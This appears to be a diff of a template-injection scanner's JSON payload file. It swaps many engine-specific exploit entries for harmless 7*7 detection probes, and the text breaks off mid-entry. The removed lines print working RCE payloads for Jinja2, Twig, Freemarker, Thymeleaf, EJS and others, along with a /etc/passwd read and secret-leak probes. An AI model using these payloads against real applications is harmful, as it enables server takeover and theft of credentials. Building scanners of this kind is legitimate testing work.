@@ -1,97 +1,1118 @@
 [
-  {"engine": "Jinja2",       "payload": "{{7*7}}",                                                                "matcher": "(?<![0-9])49(?![0-9])", "category": "detect",       "severity": "MEDIUM",   "cvss": 5.0,  "name": "Jinja2 arithmetic probe"},
-  {"engine": "Jinja2",       "payload": "{{7*'7'}}",                                                              "matcher": "7777777",               "category": "detect",       "severity": "HIGH",     "cvss": 7.5,  "name": "Jinja2 string-mul (distinguishes from Twig)"},
-  {"engine": "Jinja2",       "payload": "{{config}}",                                                              "matcher": "<Config|SECRET_KEY|DEBUG", "category": "config-leak", "severity": "HIGH",     "cvss": 7.5,  "name": "Jinja2 Flask config leak"},
-  {"engine": "Jinja2",       "payload": "{{config.items()}}",                                                      "matcher": "SECRET_KEY|DATABASE|API_KEY", "category": "config-leak", "severity": "HIGH", "cvss": 8.0,  "name": "Jinja2 config items"},
-  {"engine": "Jinja2",       "payload": "{{self}}",                                                                "matcher": "TemplateReference",     "category": "detect",       "severity": "MEDIUM",   "cvss": 5.5,  "name": "Jinja2 self reference"},
-  {"engine": "Jinja2",       "payload": "{{request}}",                                                             "matcher": "Request|wsgi|environ",  "category": "info-leak",    "severity": "MEDIUM",   "cvss": 5.5,  "name": "Jinja2 Flask request leak"},
-  {"engine": "Jinja2",       "payload": "{{request.environ}}",                                                     "matcher": "HTTP_HOST|REMOTE_ADDR", "category": "info-leak",    "severity": "MEDIUM",   "cvss": 6.0,  "name": "Jinja2 WSGI environ leak"},
-  {"engine": "Jinja2",       "payload": "{{''.__class__}}",                                                        "matcher": "class 'str'",           "category": "sandbox-probe","severity": "HIGH",     "cvss": 7.5,  "name": "Jinja2 class introspection"},
-  {"engine": "Jinja2",       "payload": "{{''.__class__.__mro__}}",                                                "matcher": "object|str",            "category": "sandbox-probe","severity": "HIGH",     "cvss": 8.0,  "name": "Jinja2 MRO walk"},
-  {"engine": "Jinja2",       "payload": "{{''.__class__.__mro__[1].__subclasses__()}}",                            "matcher": "BufferedReader|Popen|warning|class", "category": "sandbox-escape", "severity": "CRITICAL", "cvss": 9.0, "name": "Jinja2 subclasses RCE primitive"},
-  {"engine": "Jinja2",       "payload": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "matcher": "uid=\\d+", "category": "rce", "severity": "CRITICAL", "cvss": 9.8, "name": "Jinja2 Flask globals RCE"},
-  {"engine": "Jinja2",       "payload": "{{cycler.__init__.__globals__.os.popen('id').read()}}",                   "matcher": "uid=\\d+",              "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "Jinja2 cycler globals RCE"},
-  {"engine": "Jinja2",       "payload": "{{namespace.__init__.__globals__.os.popen('id').read()}}",                 "matcher": "uid=\\d+",              "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "Jinja2 namespace globals RCE"},
-  {"engine": "Jinja2",       "payload": "{{joiner.__init__.__globals__.os.popen('id').read()}}",                    "matcher": "uid=\\d+",              "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "Jinja2 joiner globals RCE"},
-  {"engine": "Jinja2",       "payload": "{{lipsum.__globals__.os.popen('id').read()}}",                            "matcher": "uid=\\d+",              "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "Jinja2 lipsum globals RCE"},
-  {"engine": "Jinja2",       "payload": "{%for x in ().__class__.__base__.__subclasses__()%}{%if 'warning' in x.__name__%}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}", "matcher": "uid=\\d+", "category": "rce", "severity": "CRITICAL", "cvss": 9.8, "name": "Jinja2 warning class RCE chain"},
-  {"engine": "Jinja2",       "payload": "{{ 'hi' if 1 else 2 }}",                                                  "matcher": "^hi$",                  "category": "detect",       "severity": "LOW",      "cvss": 3.0,  "name": "Jinja2 ternary probe"},
-  {"engine": "Jinja2",       "payload": "{{settings.SECRET_KEY}}",                                                 "matcher": "[A-Za-z0-9!@#$%^&*()_+=-]{32,}", "category": "secret-leak", "severity": "CRITICAL", "cvss": 9.0, "name": "Jinja2 Django SECRET_KEY leak"},
-
-  {"engine": "Twig",         "payload": "{{7*7}}",                                                                 "matcher": "(?<![0-9])49(?![0-9])", "category": "detect",       "severity": "MEDIUM",   "cvss": 5.0,  "name": "Twig arithmetic probe"},
-  {"engine": "Twig",         "payload": "{{7*'7'}}",                                                               "matcher": "(?<![0-9])49(?![0-9])","category": "detect",       "severity": "HIGH",     "cvss": 7.5,  "name": "Twig string-mul (49 distinguishes from Jinja2)"},
-  {"engine": "Twig",         "payload": "{{_self}}",                                                               "matcher": "Twig_Template|Twig\\\\Template", "category": "detect", "severity": "MEDIUM",   "cvss": 5.5,  "name": "Twig _self introspection"},
-  {"engine": "Twig",         "payload": "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}", "matcher": "uid=\\d+", "category": "rce", "severity": "CRITICAL", "cvss": 9.8, "name": "Twig pre-1.20 sandbox bypass RCE"},
-  {"engine": "Twig",         "payload": "{{['id']|filter('system')}}",                                              "matcher": "uid=\\d+",              "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "Twig filter system RCE"},
-  {"engine": "Twig",         "payload": "{{['id',1]|sort('system')}}",                                              "matcher": "uid=\\d+",              "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "Twig sort callback RCE"},
-  {"engine": "Twig",         "payload": "{{app.request.server.all|join(',')}}",                                     "matcher": "HTTP_HOST|REMOTE_ADDR", "category": "info-leak",    "severity": "MEDIUM",   "cvss": 6.0,  "name": "Twig Symfony server env leak"},
-  {"engine": "Twig",         "payload": "{{dump(app)}}",                                                            "matcher": "Symfony|Request|Session", "category": "info-leak",  "severity": "HIGH",     "cvss": 7.0,  "name": "Twig Symfony app dump"},
-
-  {"engine": "Smarty",       "payload": "{$smarty.version}",                                                       "matcher": "\\d+\\.\\d+\\.\\d+",   "category": "detect",       "severity": "MEDIUM",   "cvss": 5.0,  "name": "Smarty version probe"},
-  {"engine": "Smarty",       "payload": "{php}echo `id`;{/php}",                                                   "matcher": "uid=\\d+",              "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "Smarty {php} tag RCE"},
-  {"engine": "Smarty",       "payload": "{system('id')}",                                                          "matcher": "uid=\\d+",              "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "Smarty system() RCE"},
-  {"engine": "Smarty",       "payload": "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php phpinfo();?>\",self::clearConfig())}", "matcher": "Smarty", "category": "rce-write", "severity": "CRITICAL", "cvss": 9.5, "name": "Smarty writeFile RCE"},
-  {"engine": "Smarty",       "payload": "{$smarty.template_object->smarty->compile_dir}",                          "matcher": "/tmp|compile|cache",    "category": "info-leak",    "severity": "MEDIUM",   "cvss": 5.5,  "name": "Smarty compile_dir leak"},
-
-  {"engine": "Velocity",     "payload": "#set($x=7*7)$x",                                                          "matcher": "(?<![0-9])49(?![0-9])", "category": "detect",       "severity": "HIGH",     "cvss": 7.5,  "name": "Velocity arithmetic probe"},
-  {"engine": "Velocity",     "payload": "#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")", "matcher": "java\\.lang\\.UNIXProcess|Process", "category": "rce", "severity": "CRITICAL", "cvss": 9.8, "name": "Velocity Runtime.exec RCE"},
-  {"engine": "Velocity",     "payload": "$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\")",     "matcher": "Process|UNIXProcess",   "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "Velocity class.inspect RCE"},
-
-  {"engine": "Freemarker",   "payload": "${7*7}",                                                                  "matcher": "(?<![0-9])49(?![0-9])", "category": "detect",       "severity": "MEDIUM",   "cvss": 5.0,  "name": "Freemarker arithmetic probe"},
-  {"engine": "Freemarker",   "payload": "<#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}",   "matcher": "uid=\\d+",              "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "Freemarker Execute class RCE"},
-  {"engine": "Freemarker",   "payload": "${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.ProcessBuilder\",[\"id\"]).start()}", "matcher": "Process|UNIX", "category": "rce", "severity": "CRITICAL", "cvss": 9.8, "name": "Freemarker ObjectConstructor RCE"},
-  {"engine": "Freemarker",   "payload": "<#assign value=\"freemarker.template.utility.JythonRuntime\"?new()>${value(\"import os;os.system('id')\")}", "matcher": "uid=\\d+", "category": "rce", "severity": "CRITICAL", "cvss": 9.5, "name": "Freemarker Jython RCE"},
-
-  {"engine": "Mako",         "payload": "${7*7}",                                                                  "matcher": "(?<![0-9])49(?![0-9])", "category": "detect",       "severity": "MEDIUM",   "cvss": 5.0,  "name": "Mako arithmetic probe"},
-  {"engine": "Mako",         "payload": "<%import os%>${os.popen('id').read()}",                                   "matcher": "uid=\\d+",              "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "Mako os.popen RCE"},
-  {"engine": "Mako",         "payload": "<%import subprocess%>${subprocess.check_output('id',shell=True)}",        "matcher": "uid=\\d+",              "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "Mako subprocess RCE"},
-  {"engine": "Mako",         "payload": "${self.module.cache.util.os.system(\"id\")}",                              "matcher": "uid=\\d+",              "category": "rce",          "severity": "CRITICAL", "cvss": 9.5,  "name": "Mako self.module RCE chain"},
-
-  {"engine": "ERB",          "payload": "<%=7*7%>",                                                                "matcher": "(?<![0-9])49(?![0-9])", "category": "detect",       "severity": "MEDIUM",   "cvss": 5.0,  "name": "ERB arithmetic probe"},
-  {"engine": "ERB",          "payload": "<%=`id`%>",                                                                "matcher": "uid=\\d+",              "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "ERB backtick RCE"},
-  {"engine": "ERB",          "payload": "<%=system('id')%>",                                                       "matcher": "uid=\\d+",              "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "ERB system RCE"},
-  {"engine": "ERB",          "payload": "<%=IO.popen('id').read()%>",                                               "matcher": "uid=\\d+",              "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "ERB IO.popen RCE"},
-  {"engine": "ERB",          "payload": "<%=File.open('/etc/passwd').read%>",                                       "matcher": "root:x:",               "category": "file-read",    "severity": "CRITICAL", "cvss": 9.0,  "name": "ERB File.open passwd"},
-
-  {"engine": "Slim",         "payload": "#{7*7}",                                                                  "matcher": "(?<![0-9])49(?![0-9])", "category": "detect",       "severity": "MEDIUM",   "cvss": 5.0,  "name": "Slim arithmetic probe"},
-  {"engine": "Slim",         "payload": "#{`id`}",                                                                 "matcher": "uid=\\d+",              "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "Slim backtick RCE"},
-
-  {"engine": "Pug/Jade",     "payload": "#{7*7}",                                                                  "matcher": "(?<![0-9])49(?![0-9])", "category": "detect",       "severity": "MEDIUM",   "cvss": 5.0,  "name": "Pug arithmetic probe"},
-  {"engine": "Pug/Jade",     "payload": "#{process.mainModule.require('child_process').execSync('id').toString()}",  "matcher": "uid=\\d+",              "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "Pug Node child_process RCE"},
-  {"engine": "Pug/Jade",     "payload": "#{global.process.mainModule.require('child_process').execSync('id')}",     "matcher": "uid=\\d+",              "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "Pug global.process RCE"},
-
-  {"engine": "Handlebars",   "payload": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}", "matcher": "uid=\\d+", "category": "rce", "severity": "CRITICAL", "cvss": 9.8, "name": "Handlebars sandbox-escape RCE chain"},
-  {"engine": "Handlebars",   "payload": "{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}", "matcher": "uid=\\d+", "category": "rce", "severity": "CRITICAL", "cvss": 9.8, "name": "Handlebars constructor.constructor RCE"},
-
-  {"engine": "Tornado",      "payload": "{{7*7}}",                                                                 "matcher": "(?<![0-9])49(?![0-9])", "category": "detect",       "severity": "MEDIUM",   "cvss": 5.0,  "name": "Tornado arithmetic probe"},
-  {"engine": "Tornado",      "payload": "{%import os%}{{os.popen('id').read()}}",                                  "matcher": "uid=\\d+",              "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "Tornado import os RCE"},
-  {"engine": "Tornado",      "payload": "{%import subprocess%}{{subprocess.check_output('id',shell=True)}}",        "matcher": "uid=\\d+",              "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "Tornado subprocess RCE"},
-
-  {"engine": "Razor",        "payload": "@(7*7)",                                                                  "matcher": "(?<![0-9])49(?![0-9])", "category": "detect",       "severity": "MEDIUM",   "cvss": 5.0,  "name": "Razor arithmetic probe"},
-  {"engine": "Razor",        "payload": "@{//}@System.Diagnostics.Process.Start(\"cmd\",\"/c whoami\")",            "matcher": "Process|System\\.Diagnostics", "category": "rce",   "severity": "CRITICAL", "cvss": 9.8,  "name": "Razor Process.Start RCE"},
-
-  {"engine": "ASP.NET",      "payload": "<%=7*7%>",                                                                "matcher": "(?<![0-9])49(?![0-9])", "category": "detect",       "severity": "MEDIUM",   "cvss": 5.0,  "name": "ASP.NET classic arithmetic probe"},
-  {"engine": "ASP.NET",      "payload": "<%CreateObject(\"wscript.shell\").exec(\"cmd /c whoami\")%>",              "matcher": "wscript|cmd|whoami",    "category": "rce",          "severity": "CRITICAL", "cvss": 9.5,  "name": "ASP.NET wscript.shell RCE"},
-
-  {"engine": "Universal",    "payload": "${7*7}",                                                                  "matcher": "(?<![0-9])49(?![0-9])", "category": "detect",       "severity": "LOW",      "cvss": 3.0,  "name": "Universal ${} probe (Velocity/Freemarker/JSP)"},
-  {"engine": "Universal",    "payload": "{{7*7}}",                                                                 "matcher": "(?<![0-9])49(?![0-9])", "category": "detect",       "severity": "LOW",      "cvss": 3.0,  "name": "Universal {{}} probe (Jinja2/Twig/Handlebars)"},
-  {"engine": "Universal",    "payload": "*{7*7}",                                                                  "matcher": "(?<![0-9])49(?![0-9])", "category": "detect",       "severity": "LOW",      "cvss": 3.0,  "name": "Universal *{} probe (Thymeleaf)"},
-  {"engine": "Universal",    "payload": "#{7*7}",                                                                  "matcher": "(?<![0-9])49(?![0-9])", "category": "detect",       "severity": "LOW",      "cvss": 3.0,  "name": "Universal #{} probe (Slim/Pug/Ruby)"},
-  {"engine": "Universal",    "payload": "[[${7*7}]]",                                                              "matcher": "(?<![0-9])49(?![0-9])", "category": "detect",       "severity": "LOW",      "cvss": 3.0,  "name": "Universal [[${}]] probe (Thymeleaf inline)"},
-  {"engine": "Universal",    "payload": "<%= 7*7 %>",                                                              "matcher": "(?<![0-9])49(?![0-9])", "category": "detect",       "severity": "LOW",      "cvss": 3.0,  "name": "Universal <%= %> probe (ERB/JSP/EJS)"},
-
-  {"engine": "Thymeleaf",    "payload": "*{7*7}",                                                                  "matcher": "(?<![0-9])49(?![0-9])", "category": "detect",       "severity": "MEDIUM",   "cvss": 5.0,  "name": "Thymeleaf select arithmetic"},
-  {"engine": "Thymeleaf",    "payload": "[[${T(java.lang.Runtime).getRuntime().exec(\"id\")}]]",                    "matcher": "Process|UNIX|java\\.lang", "category": "rce",       "severity": "CRITICAL", "cvss": 9.8,  "name": "Thymeleaf SpEL Runtime.exec RCE"},
-  {"engine": "Thymeleaf",    "payload": "__${T(java.lang.Runtime).getRuntime().exec(\"id\")}__::.x",               "matcher": "Process|UNIX",          "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "Thymeleaf preprocessor RCE"},
-
-  {"engine": "SpEL/Spring",  "payload": "${T(java.lang.Runtime).getRuntime().exec('id')}",                          "matcher": "Process|UNIX",          "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "Spring SpEL Runtime.exec"},
-  {"engine": "SpEL/Spring",  "payload": "${new java.lang.ProcessBuilder('id').start()}",                            "matcher": "Process|UNIX",          "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "Spring SpEL ProcessBuilder"},
-  {"engine": "SpEL/Spring",  "payload": "${T(org.springframework.cglib.core.ReflectUtils).defineClass('Exploit',T(org.springframework.util.Base64Utils).decodeFromString('yv66vg...'),T(java.lang.ClassLoader).getSystemClassLoader())}", "matcher": "Exploit", "category": "rce-advanced", "severity": "CRITICAL", "cvss": 9.5, "name": "Spring SpEL CGLib reflection RCE"},
-
-  {"engine": "JSP/JSTL",     "payload": "<%= 7*7 %>",                                                              "matcher": "(?<![0-9])49(?![0-9])", "category": "detect",       "severity": "MEDIUM",   "cvss": 5.0,  "name": "JSP scriptlet probe"},
-  {"engine": "JSP/JSTL",     "payload": "<%@page import=\"java.util.*,java.io.*\"%><% Process p=Runtime.getRuntime().exec(\"id\"); java.io.BufferedReader r=new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream())); String l; while((l=r.readLine())!=null) out.println(l); %>", "matcher": "uid=\\d+", "category": "rce", "severity": "CRITICAL", "cvss": 9.8, "name": "JSP Runtime.exec full RCE"},
-
-  {"engine": "EJS",          "payload": "<%= 7*7 %>",                                                              "matcher": "(?<![0-9])49(?![0-9])", "category": "detect",       "severity": "MEDIUM",   "cvss": 5.0,  "name": "EJS arithmetic probe"},
-  {"engine": "EJS",          "payload": "<%- global.process.mainModule.require('child_process').execSync('id').toString() %>", "matcher": "uid=\\d+", "category": "rce", "severity": "CRITICAL", "cvss": 9.8, "name": "EJS process.mainModule RCE"},
-  {"engine": "EJS",          "payload": "<%= require('child_process').execSync('id').toString() %>",                "matcher": "uid=\\d+",              "category": "rce",          "severity": "CRITICAL", "cvss": 9.8,  "name": "EJS direct require RCE"}
+  {
+    "engine": "Jinja2",
+    "payload": "{{7*7}}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Jinja2 arithmetic probe"
+  },
+  {
+    "engine": "Jinja2",
+    "payload": "{{ 7 * 7 }}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Jinja2 spaced arithmetic"
+  },
+  {
+    "engine": "Twig",
+    "payload": "{{7*7}}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Twig arithmetic probe"
+  },
+  {
+    "engine": "Twig",
+    "payload": "{{7*'7'}}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Twig string-mul (49)"
+  },
+  {
+    "engine": "Django",
+    "payload": "{{7|add:42}}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Django add filter (49 via 7+42)"
+  },
+  {
+    "engine": "Freemarker",
+    "payload": "${7*7}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Freemarker arithmetic probe"
+  },
+  {
+    "engine": "Freemarker",
+    "payload": "${7 * 7}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Freemarker spaced arithmetic"
+  },
+  {
+    "engine": "Velocity",
+    "payload": "#set($x=7*7)$x",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Velocity arithmetic probe"
+  },
+  {
+    "engine": "Velocity",
+    "payload": "#set($x=7*7)${x}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Velocity braced arithmetic"
+  },
+  {
+    "engine": "Smarty",
+    "payload": "{7*7}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Smarty arithmetic probe"
+  },
+  {
+    "engine": "Smarty",
+    "payload": "{math equation='7*7'}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Smarty math function probe"
+  },
+  {
+    "engine": "ERB",
+    "payload": "<%=7*7%>",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "ERB arithmetic probe"
+  },
+  {
+    "engine": "ERB",
+    "payload": "<%= 7*7 %>",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "ERB spaced arithmetic"
+  },
+  {
+    "engine": "Slim",
+    "payload": "#{7*7}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Slim arithmetic probe"
+  },
+  {
+    "engine": "Pug/Jade",
+    "payload": "#{7*7}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Pug arithmetic probe"
+  },
+  {
+    "engine": "Handlebars",
+    "payload": "{{#with 7}}{{this}}{{/with}}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Handlebars context probe (helper-eval surface)"
+  },
+  {
+    "engine": "Mako",
+    "payload": "${7*7}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Mako arithmetic probe"
+  },
+  {
+    "engine": "Mako",
+    "payload": "${7 * 7}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Mako spaced arithmetic"
+  },
+  {
+    "engine": "Tornado",
+    "payload": "{{7*7}}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Tornado arithmetic probe"
+  },
+  {
+    "engine": "Razor",
+    "payload": "@(7*7)",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Razor arithmetic probe"
+  },
+  {
+    "engine": "ASP.NET",
+    "payload": "<%=7*7%>",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "ASP.NET classic arithmetic probe"
+  },
+  {
+    "engine": "Thymeleaf",
+    "payload": "*{7*7}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Thymeleaf select arithmetic"
+  },
+  {
+    "engine": "Thymeleaf",
+    "payload": "[[${7*7}]]",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Thymeleaf inline arithmetic"
+  },
+  {
+    "engine": "Thymeleaf",
+    "payload": "[(${7*7})]",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Thymeleaf unescaped inline arithmetic"
+  },
+  {
+    "engine": "SpEL/Spring",
+    "payload": "${7*7}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Spring SpEL arithmetic"
+  },
+  {
+    "engine": "SpEL/Spring",
+    "payload": "#{7*7}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Spring SpEL hash arithmetic"
+  },
+  {
+    "engine": "JSP/JSTL",
+    "payload": "<%= 7*7 %>",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "JSP scriptlet probe"
+  },
+  {
+    "engine": "JSP/JSTL",
+    "payload": "${7*7}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "JSP EL arithmetic probe"
+  },
+  {
+    "engine": "EJS",
+    "payload": "<%= 7*7 %>",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "EJS arithmetic probe"
+  },
+  {
+    "engine": "EJS",
+    "payload": "<%- 7*7 %>",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "EJS unescaped arithmetic probe"
+  },
+  {
+    "engine": "Nunjucks",
+    "payload": "{{7*7}}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Nunjucks arithmetic probe"
+  },
+  {
+    "engine": "Liquid",
+    "payload": "{{ 7 | times: 7 }}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Liquid times-filter probe"
+  },
+  {
+    "engine": "Dust",
+    "payload": "{7*7}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Dust arithmetic probe"
+  },
+  {
+    "engine": "Marko",
+    "payload": "${7*7}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Marko arithmetic probe"
+  },
+  {
+    "engine": "Groovy/GString",
+    "payload": "${7*7}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Groovy GString arithmetic"
+  },
+  {
+    "engine": "Velocity-NV",
+    "payload": "#{7*7}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "NVelocity arithmetic probe"
+  },
+  {
+    "engine": "Plates/PHP",
+    "payload": "<?=7*7?>",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "PHP short-echo arithmetic probe"
+  },
+  {
+    "engine": "Genshi",
+    "payload": "${7*7}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Genshi arithmetic probe"
+  },
+  {
+    "engine": "Cheetah",
+    "payload": "#set $x=7*7\n$x",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Cheetah arithmetic probe"
+  },
+  {
+    "engine": "Mustache",
+    "payload": "{{=7*7}}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Mustache change-delimiter probe (eval surface)"
+  },
+  {
+    "engine": "Jinjava",
+    "payload": "{{7*7}}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Jinjava (HubSpot) arithmetic probe"
+  },
+  {
+    "engine": "Scriban",
+    "payload": "{{7*7}}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Scriban arithmetic probe"
+  },
+  {
+    "engine": "Handlebars.java",
+    "payload": "{{multiply 7 7}}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "MEDIUM",
+    "cvss": 5.0,
+    "name": "Handlebars.java helper arithmetic"
+  },
+  {
+    "engine": "Universal",
+    "payload": "${7*7}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "LOW",
+    "cvss": 3.0,
+    "name": "Universal ${} probe (Velocity/Freemarker/JSP-EL)"
+  },
+  {
+    "engine": "Universal",
+    "payload": "{{7*7}}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "LOW",
+    "cvss": 3.0,
+    "name": "Universal {{}} probe (Jinja2/Twig/Nunjucks/Handlebars)"
+  },
+  {
+    "engine": "Universal",
+    "payload": "*{7*7}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "LOW",
+    "cvss": 3.0,
+    "name": "Universal *{} probe (Thymeleaf)"
+  },
+  {
+    "engine": "Universal",
+    "payload": "#{7*7}",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
+    "severity": "LOW",
+    "cvss": 3.0,
+    "name": "Universal #{} probe (Slim/Pug/Ruby/SpEL)"
+  },
+  {
+    "engine": "Universal",
+    "payload": "[[${7*7}]]",
+    "matcher": "(?<![0-9])49(?![0-9])",
+    "category": "detect",
